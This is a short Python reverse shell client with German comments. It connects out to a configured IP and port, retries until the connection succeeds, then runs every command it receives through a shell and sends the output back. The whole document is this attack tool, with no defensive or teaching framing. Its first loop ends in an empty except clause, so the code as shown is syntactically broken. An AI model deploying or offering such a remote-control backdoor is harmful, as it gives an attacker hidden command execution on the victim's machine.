import socket
import subprocess

HOST = '127.0.0.1'#ip zu der die connection hergestellt werden soll
PORT = 9999


while True:
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((HOST,PORT))
		break
	except:
		
while True:
    befehl = s.recv(100000)
    if str(befehl, "utf8") == 'quit': break
    prozess = subprocess.Popen(str(befehl, "utf8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output = prozess.stdout.read() + prozess.stderr.read()
    s.send(bytes(str(output), "utf8"))
s.close()